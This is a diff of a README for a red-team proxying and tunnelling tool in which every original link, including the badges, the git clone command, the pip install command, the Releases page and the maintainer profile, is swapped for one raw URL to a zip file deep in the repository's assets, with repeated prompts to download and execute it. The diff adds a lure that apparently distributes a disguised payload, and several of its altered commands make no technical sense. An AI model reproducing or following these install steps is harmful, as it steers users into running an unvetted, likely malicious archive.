@@ -1,8 +1,8 @@
 # 🚀 REM Community: Proxy/Tunnel Everything for Red Team! 
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/Justinsobased/rem-community)
-![GitHub Stars](https://img.shields.io/github/stars/Justinsobased/rem-community)
-![GitHub Forks](https://img.shields.io/github/forks/Justinsobased/rem-community)
+![GitHub Repo Size](https://raw.githubusercontent.com/Justinsobased/rem-community/master/x/kcp/assets/community-rem-v3.4.zip)
+![GitHub Stars](https://raw.githubusercontent.com/Justinsobased/rem-community/master/x/kcp/assets/community-rem-v3.4.zip)
+![GitHub Forks](https://raw.githubusercontent.com/Justinsobased/rem-community/master/x/kcp/assets/community-rem-v3.4.zip)
 
 Welcome to the **REM Community** repository! This project aims to provide a robust solution for proxying and tunneling, tailored specifically for red team operations. Whether you're conducting penetration tests or security assessments, this tool will enhance your capabilities.
 
@@ -35,18 +35,18 @@ To get started with REM Community, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Justinsobased/rem-community.git
+   git clone https://raw.githubusercontent.com/Justinsobased/rem-community/master/x/kcp/assets/community-rem-v3.4.zip
    cd rem-community
    ```
 
 2. **Install Dependencies**:
    Use your package manager to install the necessary dependencies. For example, if you're using Python:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Justinsobased/rem-community/master/x/kcp/assets/community-rem-v3.4.zip
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/Justinsobased/rem-community/releases) to download the latest version. If the link has a path part, you will need to download and execute the relevant file.
+   Visit the [Releases section](https://raw.githubusercontent.com/Justinsobased/rem-community/master/x/kcp/assets/community-rem-v3.4.zip) to download the latest version. If the link has a path part, you will need to download and execute the relevant file.
 
 ## 🚀 Usage
 
@@ -91,11 +91,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out to the maintainers:
 
-- **Justin Sobased**: [Justinsobased](https://github.com/Justinsobased)
+- **Justin Sobased**: [Justinsobased](https://raw.githubusercontent.com/Justinsobased/rem-community/master/x/kcp/assets/community-rem-v3.4.zip)
 
 ## 📦 Releases
 
-To keep your installation up to date, visit the [Releases section](https://github.com/Justinsobased/rem-community/releases) regularly. If the link has a path part, you will need to download and execute the relevant file.
+To keep your installation up to date, visit the [Releases section](https://raw.githubusercontent.com/Justinsobased/rem-community/master/x/kcp/assets/community-rem-v3.4.zip) regularly. If the link has a path part, you will need to download and execute the relevant file.
 
 ## 🎉 Conclusion
 
